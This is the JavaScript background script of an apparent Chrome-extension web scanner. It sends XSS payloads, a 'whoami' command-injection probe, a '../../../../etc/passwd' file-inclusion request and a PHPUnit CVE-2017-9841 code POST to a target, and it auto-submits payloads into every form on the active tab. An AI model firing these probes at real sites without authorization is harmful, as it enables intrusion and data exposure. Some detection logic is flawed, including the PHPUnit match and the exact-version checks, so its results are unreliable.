chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "scan") {
        let vulnerabilities = [];
        let scanPromises = [];

        // 🔍 Detect Reflected XSS
        if (request.options.xss) {
            let xssPayloads = [
                "<div id='xss-test'>XSS</div>",
                "\"><script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>"
            ];
            scanPromises.push(...xssPayloads.map(payload => {
                let testUrl = `${request.target}/?q=${encodeURIComponent(payload)}`;
                return fetch(testUrl, { method: "GET" })
                    .then(response => response.text())
                    .then(data => {
                        if (data.includes("xss-test") || data.includes("alert('XSS')")) {
                            vulnerabilities.push("[+] Reflected XSS vulnerability detected!");
                        }
                    })
                    .catch(error => console.error("XSS scan error:", error));
            }));
        }

        // 🔍 Detect Stored XSS
        if (request.options.storedXss) {
            chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
                if (tabs.length === 0) return;
                let activeTabId = tabs[0].id;
                chrome.scripting.executeScript({
                    target: { tabId: activeTabId },
                    function: () => {
                        let storedPayload = "<div id='xss-test'>XSS</div>";
                        let forms = document.forms;
                        for (let form of forms) {
                            let inputs = form.getElementsByTagName("input");
                            for (let input of inputs) {
                                input.value = storedPayload;
                            }
                            form.submit();
                        }
                    }
                }).then(() => {
                    vulnerabilities.push("[+] Stored XSS payload attempted.");

                    // ✅ Verify if the XSS payload persists
                    setTimeout(() => {
                        fetch(request.target)
                            .then(response => response.text())
                            .then(data => {
                                if (data.includes("xss-test")) {
                                    vulnerabilities.push("[!] Stored XSS successfully injected and persisted.");
                                }
                            })
                            .catch(error => console.error("Stored XSS verification error:", error));
                    }, 3000);
                }).catch(error => console.error("Stored XSS Injection Error:", error));
            });
        }

        
        // 🔍 Detect RCE (Remote Code Execution)
        if (request.options.rce) {
            let cmd = "whoami";  // Example command for RCE test
            let rceTestUrl = `${request.target}/?cmd=${encodeURIComponent(cmd)}`;
            scanPromises.push(
                fetch(rceTestUrl, { method: "GET" })
                    .then(response => response.text())
                    .then(data => {
                        // Try to extract the command output inside <pre> tags (adjust based on response structure)
                        let commandOutput = data.match(/<pre>(.*?)<\/pre>/s);  // Capture content inside <pre>...</pre>
                        
                        if (commandOutput) {
                            commandOutput = commandOutput[1].trim(); // Clean up extra whitespace

                            if (commandOutput.includes("www-data") || commandOutput.includes("root")) {
                                vulnerabilities.push(`[+] RCE exploit successful: Command executed - ${commandOutput}`);
                            } else {
                                vulnerabilities.push(`[+] RCE exploit unsuccessful: Command output - ${commandOutput}`);
                            }
                        } else {
                            vulnerabilities.push("[+] RCE exploit unsuccessful: No <pre> tag found for command output.");
                        }
                    })
                    .catch(error => console.error("RCE scan error:", error))
            );
        }



        // 🔍 Detect LFI (Local File Inclusion)
        if (request.options.lfi) {
            let lfiTestUrl = `${request.target}/?file=../../../../etc/passwd`;
            scanPromises.push(
                fetch(lfiTestUrl, { method: "GET" })
                    .then(response => response.text())
                    .then(data => {
                        // Look for sensitive content like the root user or others
                        if (data.includes("root") || data.includes("www-data")) {
                            // Capture a snippet of the file content instead of the entire HTML
                            let relevantData = data.split("\n").slice(0, 10).join("\n");  // Grab the first 10 lines
                            vulnerabilities.push(`[+] LFI exploit successful: Exposed sensitive data - \n${relevantData}`);
                        }
                    })
                    .catch(error => console.error("LFI scan error:", error))
            );
        }
        // 🔍 Detect Outdated Nginx
        if (request.options.nginx) {
            scanPromises.push(
                fetch(request.target, { method: "GET" })
                    .then(response => {
                        let serverHeader = response.headers.get("server");
                        if (serverHeader && serverHeader.toLowerCase().includes("nginx")) {
                            let versionMatch = serverHeader.match(/nginx\/(\d+\.\d+\.\d+)/);
                            if (versionMatch) {
                                let detectedVersion = versionMatch[1];
                                vulnerabilities.push(`[+] Detected Nginx version: ${detectedVersion}`);
                                if (detectedVersion != "1.27.4") {
                                    vulnerabilities.push("[!] Nginx version is outdated. Consider upgrading.");
                                }
                            }
                        }
                    })
                    .catch(error => console.error("Nginx scan error:", error))
            );
        }

        // 🔍 Detect Outdated PHP
        if (request.options.php) {
            scanPromises.push(
                fetch(request.target, { method: "GET" })
                    .then(response => {
                        let phpHeader = response.headers.get("x-powered-by");
                        if (phpHeader && phpHeader.toLowerCase().includes("php")) {
                            let versionMatch = phpHeader.match(/php\/(\d+\.\d+\.\d+)/i);
                            if (versionMatch) {
                                let detectedVersion = versionMatch[1];
                                vulnerabilities.push(`[+] Detected PHP version: ${detectedVersion}`);
                                if (detectedVersion != "8.4.4") {
                                    vulnerabilities.push("[!] PHP version is outdated and no longer secure.");
                                }
                            }
                        }
                    })
                    .catch(error => console.error("PHP scan error:", error))
            );
        }

        if (request.options.phpunit) {
            let phpunitPaths = [
                "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                "/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            ];
        
            scanPromises.push(...phpunitPaths.map(path => {
                let testUrl = `${request.target}${path}`;
                return fetch(testUrl, { method: "POST", body: "<?php echo 'VULNERABLE'; ?>" })
                    .then(response => response.text())
                    .then(data => {
                        if (data.includes("PHPUnit\\Util\\PHP")) {
                            vulnerabilities.push("[!] PHPUnit CVE-2017-9841 vulnerability detected!");
                        }
                    })
                    .catch(error => console.error("PHPUnit scan error:", error));
            }));
        }

        // 🔍 Check for missing Content Security Policy (CSP)
        scanPromises.push(
            fetch(request.target, { method: "GET" })
                .then(response => {
                    let cspHeader = response.headers.get("content-security-policy");
                    if (!cspHeader) {
                        vulnerabilities.push("[!] No Content Security Policy (CSP) detected, site may be vulnerable to XSS.");
                    }
                })
                .catch(error => console.error("CSP check error:", error))
        );

        Promise.all(scanPromises).then(() => {
            sendResponse({ message: vulnerabilities.length ? vulnerabilities.join("\n") : "[-] No vulnerabilities detected." });
        });

        return true;
    }
});



